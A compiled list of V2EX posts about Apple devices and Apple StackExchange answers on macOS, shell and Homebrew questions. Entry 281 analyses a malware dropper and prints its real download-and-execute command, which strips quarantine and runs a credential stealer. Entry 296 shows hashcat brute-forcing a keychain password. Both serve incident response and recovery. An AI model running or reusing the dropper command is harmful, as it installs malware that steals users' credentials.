**解决方案 / Solution**:
See V2EX thread for community solutions.

---

#### 271. [V2EX] 感觉 iOS 现在 Apple Intelligence 真的挺绷不住的。。。

**问题描述 / Problem Description**:
我是 美版 iPhone16Pro+美区 Apple ID这样就可以使用 Apple Intelligence但是我现在在国内，也必须使用一些国内特供的 App 。所以我也有一个国区的 Apple ID 去下载这些软件。。这就出现一个很逆天的判定，就是 Apple Intelligence 判定的是你设备里的所有账户都为环大陆的，才能启用。。。以至于我每次切国行 appleid 的时候，他都会自己删除模型（是的，是删除，不是禁用。。。）。然后每次切回来的时候，他又重新再下载一遍。。。真挺无语的，虽然下载模型似乎走的是国内的 CDN ，走的不是代理。。。要不流量就真的撑不住

**解决方案 / Solution**:
See V2EX thread for community solutions.

---

#### 272. [V2EX] 有更新了 ios18.7.8 的 V 友吗？

**问题描述 / Problem Description**:
说说续航发热怎么样，有没有什么 bug ？

**解决方案 / Solution**:
See V2EX thread for community solutions.

---

#### 273. [V2EX] 看上了苹果店里展示 MacBook Neo 的那个垫子，哪里能买到？

**问题描述 / Problem Description**:
电脑一般般，但是那个垫子感觉真不错。

**解决方案 / Solution**:
See V2EX thread for community solutions.

---

#### 274. [V2EX] 苹果中国官网挂了

**问题描述 / Problem Description**:
https://i.imgur.com/IjrixRu.png

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://i.imgur.com/IjrixRu.png

---

#### 275. [V2EX] Apple 苹果开发者现在被正式盯上了吗，报税通知邮件大家有没有收到？

**问题描述 / Problem Description**:
刚刚在某红薯上看到的，有人开始收到苹果的通知邮件了 http://xhslink.com/o/7KYhGuPB5Q4
以前 AppStore 个人开发者收入这块还是模糊地带，现在正式被税务盯上了吗，大家有没有收到邮件的讨论下

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- http://xhslink.com/o/7KYhGuPB5Q4

---

#### 276. [V2EX] 中国账号开始强制 iCloud 云贵

**问题描述 / Problem Description**:
注册或者切换国家为中国时必须同意云上贵州协议才可以之前可以单独改地区为中国，iCloud 是独立的，不同意不影响账号改区到中国，最多 iCloud 不可用

**解决方案 / Solution**:
See V2EX thread for community solutions.

---

#### 277. [V2EX] 😊Vibe 了一个给 iOS6 用的 AI 聊天客户端

**问题描述 / Problem Description**:
好像确实没啥大用哈哈，给旧设备补上新时代的这一环吧。
是根据上游仓库适配来的，添加了自定义 API ，还有多机型适配等功能。
仓库地址： https://github.com/wtfllix/ChatGPT-for-Legacy-iOS
源地址：repo.lonsdaleite.cc

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://github.com/wtfllix/ChatGPT-for-Legacy-iOS

---

#### 278. [V2EX] ios18.7.8 能更新么

**问题描述 / Problem Description**:
有个 iphone13pro ，买来的版本是 15.0.2 ，一直每升过，现在电池不太行了
不玩游戏，老毛病有俩，一个是有时候电话呼不进来；一个是导航切换延迟太大
很多软件没法儿装，都要 16 以上，今天忽然发现除了 26 ，还有个 18 的选项，点进去是 18.7.8
问问兄弟们，这玩意儿值当升级么？有啥问题没？

**解决方案 / Solution**:
See V2EX thread for community solutions.

---

#### 279. [V2EX] apple 以旧换新可以叠加 Epp 吗

**问题描述 / Problem Description**:
我的 iPhone 购买了 ac+  年年焕新计划 买新手机可以叠加 epp 吗

**解决方案 / Solution**:
See V2EX thread for community solutions.

---

#### 280. [V2EX] 这种港区（HKD）Apple store 礼品卡能不能用于买 iPhone ？

**问题描述 / Problem Description**:
https://www.coinsbee.com/zh/gift-cards/entertainment/apple/
这种礼品卡是不是能直接购买实体 iPhone 产品，选择地区为 HK 后，它上面写，

以 HKD 计价的 Apple 礼品卡只能在实体店兑换，不能在线使用。

是不是能用加密货币买礼品卡之后去香港线下买 iPhone ？

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://www.coinsbee.com/zh/gift-cards/entertainment/apple/

---

#### 281. Can anyone tell me if the script I ran embedded anything on my machine from that, or whether it accessed any private data?

**问题描述 / Problem Description**:
Tags: macos, security, hacking | Score: 13 | Views: 1832 | Answers: 1 | Created: 2026-03-21

**解决方案 / Solution**:
It's a highly obfuscated (and obviously malicious) shell command that eventually downloads and executes a binary payload with the name helper, bypassing Gatekeeper. The last stage of the drop is this:
curl -o /tmp/helper https://rvdownloads.com/usbfix/update &amp;&amp; xattr -c /tmp/helper &amp;&amp; chmod +x /tmp/helper &amp;&amp; /tmp/helper

Two of the AV engines on the VirusTotal website flag the payload as a credential stealer:
Avast        MacOS:Stealer-HH
ESET-NOD32   OSX/PSW.Agent.GR Trojan

For more information, see:
Malware campaign impersonating Claude Code install via Google (github.com).
The linked page describes what seems to be a slightly different variant:

The decrypted payload executes two osascript processes that:

Request TCC AppleEvents permission for Terminal
Browse /Applications/ via Finder (fndr,gstl) for reconnaissance
Hide the Terminal window (core,setd → Terminal)
Gather system info via multiple do shell script calls
Write a machine fingerprint hash to ~/.username
Display a fake password dialog (syso,dlog) to social-engineer the
user's macOS password
Write the captured password to ~/.pass
Create temporary staging files, read system data
Exfiltrate collected data via curl back to woupp.com
Clean up temporary files


You have to assume that all your private data is compromised.
The one mitigating feature of this malware, at least in the variant analyzed by Anthropic on GitHub, is that it has no persistence mechanism. It's apparently one and done. But I'm not a security researcher and I didn't disassemble the payload or run it to see what it does. At a minimum, you should open System Settings &gt; General &gt; Login Items &amp; Extensions and make sure there is nothing there that you don't recognize, even if it looks innocent. If there is, please report it here.
Waste no time changing all important passwords. Take whatever precautions you deem necessary against identity theft. Expect follow-on attacks attempting to defeat two-factor authentication.
For the form those follow-on attacks may take, see:
How Attackers Bypass Two-factor Authentication (2FA) (zitadel.com).

Even if the attacker has already obtained your user credentials, they still need to acquire the additional authentication factor to gain access to your account. To receive the required code from the victim, the criminal might call, text, or email them with a seemingly plausible justification. Of course, they will likely do so disguised as a trusted entity, such as Google or Apple, to minimize suspicion. Make sure to always double-check the sender’s identity, as well as the content of the text message, to avoid falling victim to a hacking attempt.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/486095/can-anyone-tell-me-if-the-script-i-ran-embedded-anything-on-my-machine-from-that

---

#### 282. Adding &quot;real&quot; creation date to scanned &quot;old&quot;pictures

**问题描述 / Problem Description**:
Tags: macos, exif | Score: 9 | Views: 1096 | Answers: 3 | Created: 2026-03-30

**解决方案 / Solution**:
Unix timestamps (as used by touch) can go before 1970 (thanks @slingerapp for pointing this out) but this is not relevant here.
exiftool can be installed directly from the ExifTool Website as a standard macOS package, or via Homebrew/MacPorts. It allows to change the EXIF metadata of the picture, including the creation date. EXIF stores the same information in different tags, ideally all of them are updated to the same value.
exiftool -DateTimeOriginal=&quot;2023:01:15 12:34:56&quot; -CreateDate=&quot;2023:01:15 12:34:56&quot; -MediaCreateDate=&quot;2023:01:15 12:34:56&quot; /path/to/image.jpg

PS: You need to do this before loading an image into Photos or similar. If it is already managed by Photos, export/copy it to a temporary folder, delete it in Photos, run exiftool and import it again.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/486151/adding-real-creation-date-to-scanned-oldpictures

---

#### 283. Is Sequoia (macOS 15) the last OS for a 2019 Intel Mac?

**问题描述 / Problem Description**:
Tags: macos, macbook-pro, software-update | Score: 6 | Views: 615 | Answers: 2 | Created: 2026-04-10

**解决方案 / Solution**:
See https://support.apple.com/en-us/122867 for the list of Mac models which Tahoe officially supports. This includes just a few Intel models:

MacBook Pro 16-inch, 2019
MacBook Pro 13-inch, 2020, 4 Thunderbolt ports
iMac Retina 27-inch, 2020
Mac Pro, 2019

**参考链接 / References**:
- https://apple.stackexchange.com/questions/486207/is-sequoia-macos-15-the-last-os-for-a-2019-intel-mac

---

#### 284. What is a reliable way to get &quot;last shutdown&quot; time via shell script in macOS Tahoe 26.4?

**问题描述 / Problem Description**:
Tags: macos, command-line, shutdown, shortcuts-app, tahoe | Score: 6 | Views: 449 | Answers: 2 | Created: 2026-04-03

**解决方案 / Solution**:
last shutdown fails for me too (macOS 15.7.5 and 26.4).
% last shutdown
wtmp begins Fri 13 Feb 2026 12:10:07 AEDT

However, last reboot | grep 'shutdown' returns all shutdown times.
You can use last reboot | grep -m 1 shutdown | cut -c 44- to catch the most recent one.
Since, as @Linc Davis says in his answer, this will not return power interruptions, you may prefer to parse last reboot which lists both orderly shutdowns and reboots.
Example:
% last reboot
reboot time                                Wed 25 Mar 12:09
shutdown time                              Wed 25 Mar 12:03
reboot time                                Sat 21 Mar 08:08
reboot time                                Thu 12 Mar 09:54
shutdown time                              Thu 12 Mar 09:51
reboot time                                Fri 13 Feb 12:10
wtmp begins Fri 13 Feb 2026 12:10:07 AEDT

Edit:
Packaging one of the methods as a Shortcut:

Of course, this only the most recent orderly shutdown.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/486178/what-is-a-reliable-way-to-get-last-shutdown-time-via-shell-script-in-macos-tah

---

#### 285. Why does “brew search” for “peertube” match with “freetube”? How does the search work?

**问题描述 / Problem Description**:
Tags: command-line, homebrew, search | Score: 6 | Views: 1369 | Answers: 1 | Created: 2025-07-23

**解决方案 / Solution**:
The brew search command uses a &quot;fuzzy search&quot; based on the &quot;DidYouMean&quot; gem. This causes search results to include formulae that are spelled similarly, by inserting, deleting, substituting, and transposing some letters. The exact algorithms and thresholds that DidYouMean uses for spelling suggestions are not documented but it appears to use Jaro-Winkler and Levenshtein distance.
&quot;peertube&quot; and &quot;freetube&quot; are spelled similarly enough that searching for the former will return the latter. You can try searching for other strings (like &quot;feertube&quot;, &quot;pretube&quot;, &quot;etube&quot;, &quot;feertub&quot;, &quot;frtbe&quot;, &quot;pertbe&quot;) to get a sense for how similar of a search term will still return a particular formula in the results, or will not.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/480853/why-does-brew-search-for-peertube-match-with-freetube-how-does-the-search

---

#### 286. Is there a way to change installation directory of brew cask applications?

**问题描述 / Problem Description**:
Tags: macos, command-line, homebrew | Score: 6 | Views: 1945 | Answers: 1 | Created: 2024-10-23

**解决方案 / Solution**:
You can override a Homebrew app install location with --appdir:
% brew help install
...
      --appdir                     Target location for Applications (default:
                                   /Applications).

% brew install --cask --appdir ~/Applications app

**参考链接 / References**:
- https://apple.stackexchange.com/questions/476279/is-there-a-way-to-change-installation-directory-of-brew-cask-applications

---

#### 287. How to install “oath-toolkit” on a MacBook Air (2017) running macOS Monterey (12.7.6)?

**问题描述 / Problem Description**:
Tags: install, homebrew, macports, two-factor-authentication | Score: 5 | Views: 294 | Answers: 2 | Created: 2026-04-19

**解决方案 / Solution**:
MacPorts has better support for legacy versions of macOS, so in your case it’s the package manager of choice.
oath-toolkit is available on MacPorts.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/486252/how-to-install-oath-toolkit-on-a-macbook-air-2017-running-macos-monterey-12

---

#### 288. Any reason homebrew env should be set twice in .zprofile?

**问题描述 / Problem Description**:
Tags: macos, homebrew, zsh | Score: 5 | Views: 487 | Answers: 1 | Created: 2026-03-10

**解决方案 / Solution**:
I would remove the last two lines.
Don’t overthink this one as it won’t do good things to your $PATH.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/486025/any-reason-homebrew-env-should-be-set-twice-in-zprofile

---

#### 289. After `brew install --cask claude-code` running `claude` fails with &quot;claude not Opened: Apple could not verify claude is free of malware...&quot;

**问题描述 / Problem Description**:
Tags: macos, command-line, homebrew, gatekeeper | Score: 5 | Views: 3951 | Answers: 1 | Created: 2025-08-20

**解决方案 / Solution**:
Run the following in terminal:
xattr -d com.apple.quarantine $(which claude)

or via GUI:

Go to &quot;Privacy &amp; Security&quot; in the &quot;Settings&quot; app
Scroll down to &quot;Security&quot;
Hit &quot;Allow Anyway&quot; next to &quot;'claude' was blocked to protect your Mac&quot;


In case this problem could be fixed upstream, I've opened a Github issue on homebrew/homebrew-cask:

https://github.com/Homebrew/homebrew-cask/issues/224670

**参考链接 / References**:
- https://apple.stackexchange.com/questions/481249/after-brew-install-cask-claude-code-running-claude-fails-with-claude-not

---

#### 290. How to mount an external drive read-only, first time?

**问题描述 / Problem Description**:
Tags: macos, hard-drive, external-disk, mount, automount | Score: 4 | Views: 91 | Answers: 1 | Created: 2026-04-14

**解决方案 / Solution**:
I found an alternative solution that worked for me, though it does need some extra kit:
Use a Linux machine to get the volume UUIDs, then configure the Mac to mount those read-only.
(I already have a tiny PC running Linux Mint, which made this relatively straightforward.  The details here are for Linux Mint 22 with Cinnamon, though I expect there are equivalents for most Linux systems.)
On the Linux box:

Configure it not to automount partitions: deselect Files app → Edit → Preferences → Behaviour → Media Handling → ‘Automatically mount removable media when inserted and on startup’.

Connect the HD.

Open the Disks app; it should be shown on the LHS.

Select the HD to see all its partitions and their UUIDs (and also the labels of unencrypted ones), and note them down.

Eject the HD: in Files, ensure the LH sidebar is showing, right-click on one of the HD’s volumes, and select Safely Remove Drive.


Then, on the Mac:

sudo vifs (from an admin account)

Add a line for each volume, in the format: UUID=&lt;UUID&gt; none auto ro

If you know the volume label, you can replace the first part with LABEL=&lt;label&gt; (and perhaps skip the Linux part!), though you need to replace special characters e.g. space → \040.

If you know the volume format, you can replace the auto with hfs or apfs.

And you can append ,noauto to prevent the volume being automounted at all, and/or change the ro to rw for read-write.



Save and exit.


(That assumes you’re familiar with vi.  If not, there’s loads of info out there.)
After that, when you connect the HD, its volumes will be automounted in read-only mode.  Trying to save anything will fail with an error such as ‘Read-only file system’ or ‘The volume “&lt;volumename&gt;” is read only.’  QEF∎

I’m still surprised there’s no all-Mac solution to this, though…
If I hadn’t had a Linux machine handy, my next attempt would probably have been to pause diskarbitrationd by sending it SIGSTOP, then work out how to manually mount each volume read-only, and finally send SIGCONT to resume the diskarbitrationd.  But that’s awkward, as neither Disk Utility nor diskutil will work without diskarbitrationd; and there are reports of significant collateral damage, even after resuming it, though I can’t confirm that.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/486230/how-to-mount-an-external-drive-read-only-first-time

---

#### 291. Is there a camera plugin for macOS to appear to be looking straight at the camera?

**问题描述 / Problem Description**:
Tags: macos, software-recommendation, camera | Score: 4 | Views: 1341 | Answers: 2 | Created: 2026-04-13

**解决方案 / Solution**:
None I can recommend for teams or zoom, even FaceTime trying to fake this out IMO isn’t a good solution (it works for panning, not so much for pupil redirection without changing the iris and eyelids). It’s the best I’ve seen, but not for your apps.

I recommend a proper teleprompter setup if you need to be looking directly at the camera no matter which streaming platform you use. If close enough is good enough, Ben has great tips for minimizing the eye angle.

https://www.bhphotovideo.com/c/buy/Teleprompters

The two Elgato products are solid and reasonably priced (USD 300 and 600).

Are you certain this matters to the audience? I would presume they are more interested in your ability to deliver the content than make eye contact while you are understandably focused on the content. For how long are you not taking a break to engage the audience by looking at the camera?

**参考链接 / References**:
- https://apple.stackexchange.com/questions/486219/is-there-a-camera-plugin-for-macos-to-appear-to-be-looking-straight-at-the-camer

---

#### 292. How does one set swap space in macOS on an Apple Silicon Mac mini?

**问题描述 / Problem Description**:
Tags: macos, memory, diskutil, virtual-memory | Score: 4 | Views: 299 | Answers: 1 | Created: 2026-04-04

**解决方案 / Solution**:
You don't need to, and can't, change the size of the swap volume. An APFS volume doesn't have a fixed size. It shares space dynamically with all other volumes in the same container. It may or may not have a minimum (reserve) and maximum (quota) space allocation, which in the case of system volumes would be determined by its role. Just leave it alone. macOS is not like Linux and you rarely, if ever, have a reason to tamper with such things.
The statistic relevant to performance is swap activity, not the total size of the backing store. This is shown in the last two lines of output of the vm_stat(1) shell command. If either of those numbers is high, that means you're trying to do more than the physical memory of the machine can easily handle, or else some long-running process is leaking memory.
See the APFS section of the diskutil(8) man page for more information about the filesystem.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/486181/how-does-one-set-swap-space-in-macos-on-an-apple-silicon-mac-mini

---

#### 293. How to set custom colorizing of “ls” output in Zsh?

**问题描述 / Problem Description**:
Tags: macos, command-line, zsh | Score: 4 | Views: 404 | Answers: 2 | Created: 2026-03-21

**解决方案 / Solution**:
LS_COLORS isn't used by the standard macOS ls (see man ls or strings /bin/ls | grep COLOR) so setting it doesn't have an effect. The standard ls also doesn't support type/suffix-specific coloring, so even with the coloring options described in ls(1) you can't get the coloring you want.
What you could do instead is to install GNU ls via Homebrew (brew install coreutils). This installs the GNU versions with a g prefix (to avoid breaking any scripts etc because the options are different), e.g. gls or gdircolors (for the full list of commands in coreutils, run ls $(brew --prefix)/Cellar/coreutils/*/bin ).
For your .zprofile:
# Set LS_COLORS
LS_COLORS='di=00;34:fi=00;0:ln=00;96:pi=00;37:so=00;37:bd=00;37:cd=00;37:or=00;93:mi=00;94:ex=00;31:*.tar=00;90:*.gz=00;90:*.awk=00;35:*.sed=00;33:*.py=00;93'
export CLICOLOR=1

# Prettify and streamline listings
alias ls='gls'
alias ll='gls -l'
alias la='gls -a'
alias lla='gls -al'
alias lf='gls -F'
alias laf='gls -laF'
alias llf='gls -lF'
alias llaf='gls -alF'

PS: When I tested this here, I also had to add --color=always, but this may be due to my specific setup.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/486098/how-to-set-custom-colorizing-of-ls-output-in-zsh

---

#### 294. Calculator: how do I enter a negative exponent?

**问题描述 / Problem Description**:
Tags: macos, ventura, calculator.app | Score: 4 | Views: 714 | Answers: 2 | Created: 2026-03-05

**解决方案 / Solution**:
After entering 9 as the exponent, click the +/- button, or press the key combination option-, to change its sign as a unary operation.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/485988/calculator-how-do-i-enter-a-negative-exponent

---

#### 295. &quot;topgrade&quot; or &quot;brew&quot; issue? Warning: Calling conflicts_with formula: is deprecated! There is no replacement

**问题描述 / Problem Description**:
Tags: command-line, homebrew | Score: 4 | Views: 1228 | Answers: 1 | Created: 2025-08-21

**解决方案 / Solution**:
This is related to homebrew due to deprecation of conflicts_with, a homebrew formula (you can think of it as an api or library function).
According to homebrew discussion on github https://github.com/orgs/Homebrew/discussions/6364#discussioncomment-14224257. Quote from jabenninghoff reply:

jabenninghoff
It seems like this is the result of this change: Homebrew/brew#20499, which deprecated conflicts_with formula. When it was done, there were still casks using this feature. While the statement was removed from the cask definitions, if it was already installed on your system, conflicts_with formula remained in the json metadata as @WinkelCode discovered.
After some testing on my system, it seems that the options for fixing are:

Ignore the deprecation warning and wait for all of the offending casks to be updated.
Reinstall all of the offending casks. This worked for me with brew reinstall wireshark-app. A brute-force approach of just reinstalling all casks should work as well.

Update: running grep -irl '&quot;formula&quot;:' &quot;${HOMEBREW_PREFIX}/Caskroom&quot; should find all the offending casks, although there may be some false alarms (for me, this included mactex-no-gui which has a depends_on formula:.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/481264/topgrade-or-brew-issue-warning-calling-conflicts-with-formula-is-deprecat

---

#### 296. Recover/Crack Password from Keychain in OS X 10.15 Catalina, via known items in keychain and potentially from logs?

**问题描述 / Problem Description**:
Tags: macos, terminal, password, keychain, logs | Score: 4 | Views: 872 | Answers: 1 | Created: 2025-05-30

**解决方案 / Solution**:
Does macOS store remnants or clear version of password in any locations?

No, there are no plain text copies or remnants of your passwords deliberately stored by macOS.
If this user account was previously able to unlock your external drive, then your drive credentials are probably still available via Apple's Keychain Access application. Since macOS 15, Keychain Access is found in /System/Library/CoreServices/Applications/Keychain Access.app.
Look for entries of kind: encrypted volume password
Older Keychain Login Files
If you are unable to unlock the older .keychain file, then you will need to recover the password.
Keychain Password Recovery
It is possible to recover a Keychain password, particularly if you have an idea of the likely password's format.
See Recovering Lost and Forgotten Keychain Passwords for a practical example that uses my Keysafe tool and hashcat to perform a brute force search.
Below are the main steps, assuming homebrew and a word list are already available:
brew tap miln-eu/miln-eu
brew install miln-keysafe hashcat

keysafe -recover -path sample.keychain &gt; keychain-hash.txt
sed 's/^[^:]*://' keychain-hash.txt &gt; for-hashcat.txt

hashcat -m 23100 --keep-guessing for-hashcat.txt ~/Downloads/clem9669_wordlist_small

Keychain Format and Encryption
The file format for Keychain is public but not documented. This is how I was able to write Keysafe without building on any Apple frameworks or libraries.
I am not aware of any exploits. The choices Apple's engineers made have withstood over a decade of scrutiny. There are some odd aspects which complicate the code but nothing consequential.
Keychain encryption is two step:

Decrypt a per-file primary key;
Decrypt the per-item symmetric keys using the primary key.

The recovery hash contains the data, salt, and IV for the primary key. hashcat understands the recovery hash format and can aid with finding passwords that appear to work. For help with decrypting, the Information Security Stack Exchange may be helpful.
I am not aware of any implementation that directly attempts to decode the per-item symmetric keys. These keys are encrypted using the primary key.
For licensed users, Keysafe v1.9's -export archive includes the symmetric key table and meta data. This extra information may be technically interesting but is unlikely to ease decryption. The export also includes the primary key recovery hash.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/480184/recover-crack-password-from-keychain-in-os-x-10-15-catalina-via-known-items-in

---

#### 297. Side effects of changing the default shell in macOS to a Homebrew location

**问题描述 / Problem Description**:
Tags: macos, command-line, bash, homebrew | Score: 4 | Views: 498 | Answers: 2 | Created: 2025-03-24

**解决方案 / Solution**:
Sure, using a user-installed binary as a login shell has its risk, but so does running an outdated version even if it is supplied by Apple.
You can minimize the risk by

using a dedicated user with admin rights to maintain the homebrew installation (to avoid accidential or malicious insertion of backdoored commands in the homebrew bin directory during daily use),
creating a backup admin user with a macOS-supplied login shell (to protect against the risk of accidentical deletion of the Homebrew version or the symlink),
using brew pin bash to prevent unexpected updates (to protect against the very low bitcoiner risk), and update manually if required.

PS: Not risk-related, but you should add /opt/homebrew/bin/bash to /etc/shells to make chsh work without sudo.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/479207/side-effects-of-changing-the-default-shell-in-macos-to-a-homebrew-location

---

#### 298. Purchase/download button missing in Mac AppStore, how do I get it back?

**问题描述 / Problem Description**:
Tags: macos, mac-appstore, tahoe | Score: 3 | Views: 157 | Answers: 1 | Created: 2026-04-14

**解决方案 / Solution**:
AppStore (and Books.app for that matter) have various glitches and this is one of them.
For example, I can reproduce the loss of the &quot;Purchase&quot;, or &quot;Install&quot; button by enabling &quot;Hover Text&quot; in System Settings and pressing the cmd key whilst going over items like the &quot;Cancel&quot; button in your screenshot:

It will stay lost even after quitting and re-launching AppStore and I can bring it back by using &quot;Hover Text&quot; on certain items in the main AppStore background window (a reboot also did revive it).
Another, but less permanent way - as commented by Linc Davis - is to drag the window, including the purchase sheet, into Mission Control (the top spaces bar).
Also dragging the main window makes the button disappear and reappear in rapid succession.
Which brings us to the answer: According to nohillside's comments, dragging the main AppStore window slightly offscreen and back again, did in fact revive the &quot;Purchase&quot; button.
Why this behaviour persisted through reboots is still a mystery to me though.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/486229/purchase-download-button-missing-in-mac-appstore-how-do-i-get-it-back

---

#### 299. How do I stop Apple Notes on macOS from converting #hashtags into tags?

**问题描述 / Problem Description**:
Tags: macos, notes.app | Score: 3 | Views: 76 | Answers: 1 | Created: 2026-03-10

**解决方案 / Solution**:
Edit → Substitutions → Smart Tags → disable.

Huge thanks to Reddit for pointing this out! https://www.reddit.com/r/applehelp/comments/s7t2eo/comment/i9t503b/

**参考链接 / References**:
- https://apple.stackexchange.com/questions/486029/how-do-i-stop-apple-notes-on-macos-from-converting-hashtags-into-tags

---

#### 300. Can my MacBook Pro support this 3-screen setup?

**问题描述 / Problem Description**:
Tags: macbook-pro, mac, display, thunderbolt, accessories | Score: 3 | Views: 449 | Answers: 3 | Created: 2025-08-09

**解决方案 / Solution**:
According to the „Supports“ section on the product page, this dock only supports one external display on macOS.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/481100/can-my-macbook-pro-support-this-3-screen-setup

---

#### 301. Getting &quot;“Chromium” is damaged and can’t be opened.&quot; after installing with `brew install --cask chromium`

**问题描述 / Problem Description**:
Tags: install, homebrew, gatekeeper, macos | Score: 3 | Views: 2542 | Answers: 1 | Created: 2025-05-03

**解决方案 / Solution**:
The Chromium binary isn't code-signed. There's a simple workaround: uninstall Chromium and reinstall with the --no-quarantine flag which tells homebrew to remove the quarantine attribute automatically (do this only if you trust the binary you're installing):
brew uninstall chromium
brew install --cask chromium --no-quarantine

**参考链接 / References**:
- https://apple.stackexchange.com/questions/479829/getting-chromium-is-damaged-and-can-t-be-opened-after-installing-with-brew

---

#### 302. When opening terminal applications, launchd is setting the initial $PATH inconsistently. Why?

**问题描述 / Problem Description**:
Tags: macos, terminal, launchd, zsh, path | Score: 3 | Views: 420 | Answers: 1 | Created: 2025-04-06

**解决方案 / Solution**:
What I would like to know is what it will be tomorrow, why, and whether I can lock it down without overriding it.

The PATH environment variable is subject to change between releases of macOS. For Power Manager, we recently had to actively set more environment variables after macOS changed its behaviour.
If you require a predictable PATH environment variable, proactively set it based on your needs.
darwin/sysroot/include/paths.h
Within the underlying darwin source code are the following constants:
#define _PATH_DEFPATH &quot;/usr/local/bin:/bin:/usr/bin&quot;
#define _PATH_STDPATH &quot;/bin:/usr/bin:/sbin:/usr/sbin&quot;

It is likely everything appended to these values is application specific; be that by the developers' choice or through user configuration files.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/479428/when-opening-terminal-applications-launchd-is-setting-the-initial-path-inconsi

---

#### 303. How to add date and time instead of &quot;-1&quot; to &quot;duplicate&quot; files (files with names which already exists in the same folder)?

**问题描述 / Problem Description**:
Tags: macos, finder, filesystem, automation | Score: 2 | Views: 325 | Answers: 1 | Created: 2026-04-21

**解决方案 / Solution**:
No, but instead of downloading the files in a web browser, you may be able to adapt this solution:
Source - https://stackoverflow.com/a/76231090
Posted by l'L'l
Retrieved 2026-04-21, License - CC BY-SA 4.0
url=&quot;https://example.com/media/document.txt&quot;
curl -o &quot;$(basename ${url%.*}-$(date +&quot;%Y-%m-%d&quot;).${url##*.})&quot; -s &quot;$url&quot; -C -

It will only work if the server allows deep linking.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/486275/how-to-add-date-and-time-instead-of-1-to-duplicate-files-files-with-names

---

#### 304. Why can’t a disk be ejected because Finder is using it?

**问题描述 / Problem Description**:
Tags: macos, finder, hard-drive | Score: 2 | Views: 69 | Answers: 2 | Created: 2026-04-09

**解决方案 / Solution**:
Finder is always running on macOS. It shows the dock and folders it may contain in the dock based on your settings.
The quick fix is log out (apple menu) and if you’re in the middle of things in apps, be sure to save your work and decide upon whether to check the “reopen apps” box. Either way, watch how long the log out takes - that is an indication how much the apps haven’t finished cleaning up or have things open.
Once you’re logged out, disconnect the drive (assuming you don’t more than one graphical user logged in to the Mac).
We would need a lot more context to guess if your apps have files open, Time Machine is involved, command line tools and processes are responsible for Finder reporting a disk isn’t ready to eject, etc…

To get at the true source of the ongoing access:

open terminal.app
type fuser -c
drag the icon of the disk into the window after your typing
press return

**参考链接 / References**:
- https://apple.stackexchange.com/questions/486201/why-can-t-a-disk-be-ejected-because-finder-is-using-it

---

#### 305. Why is it that since updating to macOS 26, it shows all WiFi including personal hotspot that is off, not my current WiFi?

**问题描述 / Problem Description**:
Tags: macos, wifi, tethering | Score: 2 | Views: 169 | Answers: 1 | Created: 2026-03-16

**解决方案 / Solution**:
In the menu bar item, the icon of the active network is outlined in blue. It won't necessarily be at the top. All known networks are listed by name in alphabetical order.
Also, as helpfully pointed out by @Marc Wilson in a comment, the WiFi hotspot created by an iPhone switches on and off automatically on demand, if you've enabled Personal Hotspot &gt; Allow Others to Join in the Cellular settings.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/486065/why-is-it-that-since-updating-to-macos-26-it-shows-all-wifi-including-personal

---

#### 306. Virtual Desktop switching issue

**问题描述 / Problem Description**:
Tags: macos, macbook-pro, system-settings, keybindings | Score: 2 | Views: 94 | Answers: 1 | Created: 2026-03-04

**解决方案 / Solution**:
There is no technical reason for this, so the answer basically can only be “because Apple decided to do it so”.
Conceptually I see a difference between switching to previous/next space and jumping to a space directly. How would sliding even work if you are on space 3 and jump to 9, should it briefly show spaces 4 to 8? So it makes lot of sense to use animations only for “swiping” to the previous/next space.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/485984/virtual-desktop-switching-issue

---

#### 307. Notifications are only shown when the specific app is opened

**问题描述 / Problem Description**:
Tags: macbook-pro, notifications, apple-silicon | Score: 2 | Views: 105 | Answers: 1 | Created: 2026-02-20

**解决方案 / Solution**:
Notifications on iOS are pushed from an Apple service, they are not provided by the app directly.
On macOS, the application has to be running to receive notifications.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/485909/notifications-are-only-shown-when-the-specific-app-is-opened

---

#### 308. How do I log in on a pre-2017 MacBook Pro running macOS 13.7.8 (Ventura), when all recommended solutions have failed?

**问题描述 / Problem Description**:
Tags: macbook-pro, keyboard, password, filevault, ventura | Score: 2 | Views: 141 | Answers: 3 | Created: 2026-02-08

**解决方案 / Solution**:
If you are just trying to recover data, then I would suggest trying to use Target Disk mode to another Mac (assuming you can source one).

https://support.apple.com/en-gb/guide/mac-help/mchlp1443/13.0/mac/13.0

Essentially, connect this Mac to another Mac with USB or Thunderbolt cable, and press T while booting it. It should then act like an external disk to your other Mac.
I would also stress the importance of having a backup copy of important documents.

**参考链接 / References**:
- https://apple.stackexchange.com/questions/485824/how-do-i-log-in-on-a-pre-2017-macbook-pro-running-macos-13-7-8-ventura-when-a

---

#### 309. Terminals prompting for login and not starting properly anymore

**问题描述 / Problem Description**:
Tags: terminal, iterm, login | Score: 2 | Views: 522 | Answers: 1 | Created: 2025-08-13

**解决方案 / Solution**:
I resolved this issue after working with IT and wanted to share an update in case anyone runs into something similar. It turned out the problem wasn’t related to any files, settings, or system corruption as I initially suspected. Our company uses Ubikeys for authentication, and IT explained that a recent macOS update introduced a bug where the system fails to properly recognize the Ubikey. This caused login prompts to appear even when authentication should have worked.
IT mentioned they reported the issue to Apple, but Apple hasn’t acknowledged it yet. As a workaround, they reset the root password and Ubikey authentication, which restored normal functionality—for now, at least, until the bug resurfaces.

